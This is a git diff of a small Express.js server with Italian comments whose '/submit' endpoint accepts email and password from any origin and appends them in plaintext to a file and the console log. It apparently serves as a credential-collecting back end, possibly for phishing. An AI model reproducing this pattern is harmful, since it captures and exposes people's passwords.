@@ -3,33 +3,32 @@ const fs = require('fs');
 const cors = require('cors');
 
 const app = express();
-const PORT = 3000;
-
-// Middleware
-app.use(cors());
 app.use(express.json());
+app.use(cors());
 
-// Endpoint per salvare i dati
-app.post('/save-data', (req, res) => {
+// Endpoint per ricevere i dati
+app.post('/submit', (req, res) => {
     const { email, password } = req.body;
 
+    // Controlla se i dati sono validi
     if (!email || !password) {
-        return res.status(400).json({ error: 'Email e password sono obbligatorie.' });
+        return res.status(400).send('Email e password sono obbligatorie!');
     }
 
     // Salva i dati in un file
     const data = `Email: ${email}, Password: ${password}\n`;
     fs.appendFile('logindata.txt', data, (err) => {
         if (err) {
-            console.error('Errore durante il salvataggio dei dati:', err);
-            return res.status(500).json({ error: 'Errore interno del server.' });
+            console.error('Errore nel salvataggio dei dati:', err);
+            return res.status(500).send('Errore del server');
         }
         console.log('Dati salvati:', data);
-        res.json({ message: 'Dati salvati con successo!' });
+        res.status(200).send('Dati ricevuti con successo');
     });
 });
 
-// Avvio del server
+// Avvia il server
+const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-    console.log(`Server in ascolto su http://localhost:${PORT}`);
+    console.log(`Server in ascolto sulla porta ${PORT}`);
 });
